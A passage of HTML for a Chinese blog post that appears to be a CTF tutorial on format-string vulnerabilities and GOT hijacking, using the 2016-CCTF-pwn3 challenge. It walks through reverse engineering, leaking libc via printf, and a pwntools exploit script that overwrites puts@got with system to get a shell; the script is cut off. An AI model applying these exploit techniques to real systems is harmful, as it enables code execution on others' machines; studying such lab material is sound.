@@ -1,0 +1,361 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT 附件：链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1H9AVH4wXct8gxkf9GV0YWA提取码：140h例题：2016-CCTF-pwn3  原理现在的C程序中，libc的函数是通过GOT表来实现跳转的。在没有开启RELRO（或开启Partial RELRO）保护的前提下，每个libc的函数对应的GOT表项是可以被">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-6%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-hijack%20GOT/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT 附件：链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1H9AVH4wXct8gxkf9GV0YWA提取码：140h例题：2016-CCTF-pwn3  原理现在的C程序中，libc的函数是通过GOT表来实现跳转的。在没有开启RELRO（或开启Partial RELRO）保护的前提下，每个libc的函数对应的GOT表项是可以被">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-03/800/450">
+<meta property="article:published_time" content="2020-08-21T05:20:11.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:15.760Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-03/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-6%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-hijack%20GOT/",
+  "image": "https://picsum.photos/seed/blog-cover-03/800/450",
+  "datePublished": "2020-08-21T05:20:11.000Z",
+  "dateModified": "2026-07-03T14:46:15.760Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-6%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-hijack%20GOT/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-03/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-21T05:20:11.000Z" title="发表于 2020-08-21 13:20:11">2020-08-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:15.760Z" title="更新于 2026-07-03 22:46:15">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PWN入门（2-1-6）-格式化字符串漏洞-hijack-GOT"><a href="#PWN入门（2-1-6）-格式化字符串漏洞-hijack-GOT" class="headerlink" title="PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT"></a>PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT</h1><blockquote>
+<p>附件：<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA">https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA</a><br>提取码：140h<br>例题：2016-CCTF-pwn3</p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>现在的C程序中，libc的函数是通过GOT表来实现跳转的。在没有开启RELRO（或开启Partial RELRO）保护的前提下，每个libc的函数对应的GOT表项是可以被修改的。因此修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。</p>
+<p>假设我们将函数A的地址覆盖为函数B的地址，那么这一攻击技巧可以分为以下步骤</p>
+<ul>
+<li><p>确定函数A的GOT表地址</p>
+</li>
+<li><p>主要利用函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找</p>
+</li>
+<li><p>确定函数B的内存地址</p>
+</li>
+<li><p>需要想办法泄露对应函数B的地址</p>
+</li>
+<li><p>将函数B的内存写入到函数A的GOT表地址处</p>
+</li>
+<li><p>需要利用函数的漏洞来触发</p>
+</li>
+<li><p>写入函数：write函数<br>- ROP</p>
+</li>
+<li><p><code>pop eax; ret; # printf@got -&gt; eax</code><br>   - <code>pop ebx; ret; # (addr_offset = system_addr - printf_addr) -&gt; ebx</code><br>   - <code>add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset</code></p>
+</li>
+<li><p>格式化字符串任意地址写</p>
+</li>
+</ul>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>将文件下载下来，检查一下文件的保护情况：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597987510600-11228009-e985-4028-a2b9-ed5c42e3792e.png" alt="QQ截图20200821132459.png"></p>
+<p>32为程序，只开启了NX（栈不可执行保护）</p>
+<h3 id="查看程序的执行流程"><a href="#查看程序的执行流程" class="headerlink" title="查看程序的执行流程"></a>查看程序的执行流程</h3><p>将文件扔到IDA中，查看程序的流程：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597987640759-53777bd0-a7a9-48bd-8d03-7a85913a4541.png" alt="QQ截图20200821132643.png"></p>
+<p>进入查看ask_username函数（更改ask函数的类型为void，因为此函数明显没有返回值）：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597987741594-df5264ff-6a20-4c40-99bc-937d2ba685f2.png" alt="QQ截图20200821132851.png"></p>
+<p>可以看到，这个函数将我们输入的src进行了每一位+1变换；比如我们输入的是abc，那么变换之后的内容就是bcd。</p>
+<p>然后将变换后的src变量copy给dest变量（也就是main函数的s1变量）。</p>
+<blockquote>
+<p>注：ask_username的传参方式为char *dest，这种传参方式就导致了main函数的s1变量的变化</p>
+</blockquote>
+<p>进入查看ask_password函数（仍然将函数的类型改为void）</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597988095810-3a15df4b-c4d0-4ebd-a00e-dc7345678cc6.png" alt="QQ截图20200821133445.png"></p>
+<p>可以看到，这个函数检查的是我们在ask_username输入的内容，由于有strcmp函数的存在，因此我们可以反推我们要输入正确的内容是“rxraclhm”。输入正确之后进入第二层while循环，print_prompt()如下：（类型改为void）</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597988326182-b3f0b4e9-1c63-47bf-9891-eb7a7f917be5.png" alt="QQ截图20200821133836.png"></p>
+<p>进入get_command()函数：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597988380387-1a7202b6-c2cd-4943-8eed-f5fd3f5ccc91.png" alt="QQ截图20200821133925.png"></p>
+<p>可以看到这里让我们输入命令来控制程序的流程，并将返回值返回到main函数的v3。</p>
+<p>进入main函数查看put_file()函数（改为void）：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597988751650-07322715-eb61-4816-848c-a8243f13eef7.png" alt="QQ截图20200821134542.png"></p>
+<p>这个函数进行了两次的输入，具体流程就不用管了，这又不是逆向，你说对吧？</p>
+<p>查看show_dir()（还是改为void）</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597989260800-9587b658-21b5-4980-99e7-0aa17937f937.png" alt="QQ截图20200821135411.png"></p>
+<p>看一下伪代码，emmm，不想看，运行一下程序就知道了：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597989338367-4866a292-b920-4696-8c20-537f83a29358.png" alt="QQ截图20200821135528.png"></p>
+<p>得出这个函数的作用：将我们输入的文件名全部打印出来。</p>
+<p>看一下最后一个函数（改为void类型）：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597989636718-1bf36d73-a21d-4f36-a779-6bf391e76f43.png" alt="QQ截图20200821140009.png"></p>
+<blockquote>
+<p>注意：这个函数的s1和main函数中的不一样，从他们的栈空间就可以知道不相同。</p>
+</blockquote>
+<p>这个函数会有一次输入，让我们选择要打印的文件名称，并且打印出我们输入的文件内容，并且能够在最后看到很明显的格式化字符串漏洞（printf(&amp;dest)）</p>
+<h3 id="getshell的思路"><a href="#getshell的思路" class="headerlink" title="getshell的思路"></a>getshell的思路</h3><p>看完了这些函数的功能之后，就得思考怎么getshell；从IDA中我们可以很清晰的看到：没有system函数，没有’&#x2F;bin&#x2F;sh’字符串。那么尝试一下leak（泄露）libc。</p>
+<p>从上面的函数流程可以看到，除了有一个格式化字符串漏洞，其他地方基本上都是完美的。</p>
+<p>那么我们就用printf函数来泄露出函数的真实地址。</p>
+<h4 id="确定格式化字符串偏移"><a href="#确定格式化字符串偏移" class="headerlink" title="确定格式化字符串偏移"></a>确定格式化字符串偏移</h4><p>首先我们使用IDA查看一下会造成危险的printf地址：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597997208690-c4a4caa0-b895-47f0-bd46-eb0ba46f55e3.png" alt="QQ截图20200821160641.png"></p>
+<p>其地址为：0x0804889E</p>
+<p>接下来在Linux中使用pwngdb进行调试，在0x0804889E处下断点，执行程序：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597997509009-0534127a-9214-4371-a877-0f15b98610c9.png" alt="QQ截图20200821161119.png"><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597997510131-b1f04986-d037-4897-a784-06cd4462275f.png" alt="QQ截图20200821161139.png"></p>
+<p>解释一下上图的过程：</p>
+<p>下完断点之后我们还需要做一些工作才能够实现效果：首先输入登录密码进入，输入”put“调用put_file函数执行录入功能，首先输入文件名“Cyberangel”（我自己的名字，你愿意输入啥都行），接着输入我们的测试字符串“AAAA%p%p%p%p%p%p%p%p%p%p%p%p”，然后输入“get“调用get_file函数执行打印功能，输入“Cyberangel”也就是我们刚才创建的文件名，回车之后程序就会停在printf函数处。</p>
+<p>我们看一下栈上的情况：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597997732190-3087892b-4b5a-4ee4-bc60-dc3557adb42b.png" alt="QQ截图20200821161524.png"></p>
+<p>输入c继续执行程序，看它会输出什么：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597997978515-a160eca6-2e4b-402d-9e50-a0dd57c93b60.png" alt="QQ截图20200821161655.png"></p>
+<p>很容易得到我们输入的字符串偏移为7。</p>
+<h4 id="泄露puts函数地址"><a href="#泄露puts函数地址" class="headerlink" title="泄露puts函数地址"></a>泄露puts函数地址</h4><p>我们知道了字符串的偏移为7，剩下的只要知道puts@got地址就可以了。这很好办，交给pwntools中的elf模块就可以了，所以构建的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%8$s&#x27;</span> + p32(puts_got)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
+</blockquote>
+<p>我们将%s放在第7位，puts@got放在第8位，这样%8$s就会把puts函数的真实地址打印出来了。为什么要这样布置呢，其实是为了方便接收打印出来的字符串。<strong><span style="color: #F5222D">这样布置后puts函数的真实地址会在前4个字节打出来，所以只需要接收前四个就可以了。</span></strong></p>
+<blockquote>
+<p>当然你也可以选择：payload &#x3D; p32(puts_got) + ‘%7$s’<br>这种方式，不过打印出来的内容需要**<span style="color: #F5222D">从第5个字节开始接收</span>**</p>
+</blockquote>
+<p>就这样，我们使用printf加上’%8$s’就打印出了程序运行时puts函数的真实地址（打印出前4个字节）</p>
+<p>再使用pwntools中的recv()[:4]接受一下就ok了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure>
+
+<h4 id="找system函数地址"><a href="#找system函数地址" class="headerlink" title="找system函数地址"></a>找system函数地址</h4><p>由于我们使用的是本地的libc，所以挂载本地的libc就行了。查看一下程序在运行时使用的libc文件：</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597998871640-3125a9aa-d28b-452d-8734-7816e2aef49c.png" alt="QQ截图20200821163404.png"></p>
+<blockquote>
+<p>如果是远程的话，在上面我们已经知道了puts函数的真实地址，查找一下libc所对应的版本就行了</p>
+</blockquote>
+<p>从上图可以看到真正用到的是”&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6“这个库，所以把这个库载入进来就可以了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<h4 id="覆盖puts函数"><a href="#覆盖puts函数" class="headerlink" title="覆盖puts函数"></a>覆盖puts函数</h4><p>我们之前已经用过了puts_file函数和get_file函数，接下来就该使用show_dir函数了。</p>
+<p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597989260800-9587b658-21b5-4980-99e7-0aa17937f937.png" alt="QQ截图20200821135411.png"></p>
+<p>基本思路是这样的：</p>
+<p>回顾一下show_dir函数，这个函数会将我们输入的文件名存放在变量s中，最后会作为puts函数的参数打印出来。<strong><span style="color: #F5222D">那么如果将puts函数替换成system函数，并且我们创建一个叫”&#x2F;bin&#x2F;sh”的文件名，那么原本应该执行的是puts(s)，但实际上执行的却是system(“&#x2F;bin&#x2F;sh”)</span></strong>，前期都是准备工作，拿shell才是终极目的！！！</p>
+<p>那么覆盖的过程依然利用格式化字符串进行覆盖，这里介绍一下pwntools中的一个函数fmtstr_payload</p>
+<h5 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h5><p><img src="/assets/posts/pwn-2-1-6-hijack-got-3nej9n/assets/1597999323723-05eb935a-4375-4436-90bf-32b36e94c4d3.png"></p>
+<p>这个函数主要的用途就是利用格式化字符串漏洞覆盖某处地址，所以我们的覆盖payload就可以这样写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: sys_addr&#125;)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>7：距离格式化字符串的偏移<br>puts_got：被覆盖的地址<br>sys_addr：覆盖的地址</p>
+</blockquote>
+<h4 id="执行dir拿shell"><a href="#执行dir拿shell" class="headerlink" title="执行dir拿shell"></a>执行dir拿shell</h4><p>在覆盖之后紧接着就可以输入dir调用show_dir函数，原本的puts(“&#x2F;bin&#x2F;sh;”)就会转而执行system(“&#x2F;bin&#x2F;sh;”)，然后就可以getshell了.</p>
+<blockquote>
+<p>为什么&#x2F;bin&#x2F;sh后面会有一个分号？<br>因为system函数调用的时候是这样的system(“&#x2F;bin&#x2F;sh;”)，所以为了能够执行成功，所以加了一个分号</p>
+</blockquote>
+<h3 id="回顾思路"><a href="#回顾思路" class="headerlink" title="回顾思路"></a>回顾思路</h3><p>输入密码 –&gt; 输入put创建文件 –&gt; 输入文件名”&#x2F;bin&#x2F;sh;” –&gt; 输入文件内容（覆盖的payload）–&gt; 输入get打印文件内容 –&gt; 输入要打印的文件名”&#x2F;bin&#x2F;sh;”执行覆盖</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">pwn3 = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)</span><br><span class="line"><span class="comment">#登录密码：rxraclhm</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;rxraclhm&#x27;</span>)</span><br><span class="line"><span class="comment">#通过puts函数把部署好的泄露任意地址的payload写进去</span></span><br><span class="line">puts_got = pwn3.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Cyberangel&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;then, enter the content:&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;%8$s&#x27;</span> + p32(puts_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#通过get泄露puts函数地址</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;Cyberangel&#x27;</span>)</span><br><span class="line">puts_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="comment">#从库中找到system函数地址</span></span><br><span class="line">libc = ELF (<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#将第七个参数的puts函数地址改成system函数地址</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: sys_addr&#125;)</span><br><span class="line">sh.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)</span><br><span class="line"><span class="comment">#在运行show_dir时将puts(”/bin/sh;“)变成system(&quot;/bin/sh;&quot;),并成功获取shell</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;then, enter the 